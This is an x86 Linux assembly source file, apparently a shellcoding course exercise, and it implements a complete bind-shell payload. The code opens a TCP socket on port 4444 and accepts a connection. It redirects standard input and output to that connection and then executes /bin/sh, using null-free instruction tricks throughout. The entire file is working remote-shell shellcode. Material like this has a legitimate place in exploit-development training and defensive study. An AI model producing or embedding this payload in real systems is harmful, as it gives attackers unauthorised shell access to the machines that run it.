; Filename: bind_tcp.nasm
; Author:   Ahmed Kasmani
; Website:  http://securitytube.net
; Reference: http://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/in.h.html, to check the sockaddr_in struct details and size
;
; Purpose: 

global _start			

section .text
_start:
    
    ; creating a socket
    xor ebx, ebx
    mov bl, 0x02

    xor ecx, ecx    
    mov cl, 0x01

    xor edx, edx
   
    xor eax, eax
    mov ax, 0x167
    int 0x80


    ; bind 
    mov ebx, eax

    xor ecx, ecx
    push ecx ; push INADDR_ANY
    ; push word 0xbb01 ; push 443
    push word 0x5C11 ; push 4444
    push word 0x02 ; push AF_INET
    mov ecx, esp

    xor edx, edx
    mov dl, 0x10

    xor eax, eax
    mov ax, 0x169
    int 0x80


    ; listen
    ; ebx already should have address of socket_fd created in socket command
    xor ecx, ecx

    xor eax, eax
    mov ax, 0x16B
    int 0x80


    ; call accept4
    push ecx
    mov esi, ecx
    mov ecx, esp
    mov edx, esp

    xor eax, eax
    mov ax, 0x16C
    int 0x80


    ; dup2 3 times
    ; 1st time dup2 for STDIN_FILENO
    mov ebx, eax
    ; #define STDIN_FILENO	0
    xor ecx, ecx    

    xor eax, eax
    mov al, 0x3F
    int 0x80


    ; 2nd time dup2 for STDOUT_FILENO
    mov cl, 0x1

    xor eax, eax
    mov al, 0x3F
    int 0x80


    ; 3rd time dup2 for STDERR_FILENO
    mov cl, 0x2

    xor eax, eax
    mov al, 0x3F
    int 0x80


    ; this is the execve part
    
    xor eax, eax
    xor ebx, ebx

    ; push 0x00000000 to stack
    push ebx
    ; mov the above 0 to edx, the last param of execve
    mov edx, esp

    ; push //bin/sh to the stack, moving it to ebx
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp

    
    xor ecx, ecx
    push ecx
    push ebx
    mov ecx, esp


    mov al, 0xb
    int 0x80
